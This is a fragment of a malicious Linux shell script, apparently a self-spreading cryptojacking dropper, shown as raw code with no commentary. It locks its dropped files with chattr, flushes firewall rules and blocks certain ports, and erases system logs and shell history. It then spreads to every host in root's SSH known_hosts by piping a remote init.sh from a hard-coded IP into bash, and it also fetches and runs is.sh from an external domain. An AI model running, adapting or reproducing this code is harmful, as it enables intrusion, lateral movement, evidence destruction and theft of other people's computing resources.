        fi

    chmod 777 /tmp/zzh
    chattr +i /tmp/zzh
    chmod 777 /tmp/newinit.sh
    chattr +i /tmp/newinit.sh
        
fi

iptables -F
iptables -X
iptables -A OUTPUT -p tcp --dport 7777 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP
service iptables reload
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history
chmod 444 /usr/bin/chattr
chmod 444 /bin/chattr
yum install -y bash 2>/dev/null
apt install -y bash 2>/dev/null
apt-get install -y bash 2>/dev/null
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o-  http://45.83.123.29/cleanfda/init.sh | bash >/dev/null 2>&1 &' & done
fi
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'cd1 -o-  http://45.83.123.29/cleanfda/init.sh | bash >/dev/null 2>&1 &' & done
fi
echo "$bbdir"
echo "$bbdira"

$bbdir -fsSL http://en2an.top/cleanfda/is.sh | bash
$bbdira -fsSL http://en2an.top/cleanfda/is.sh | bash
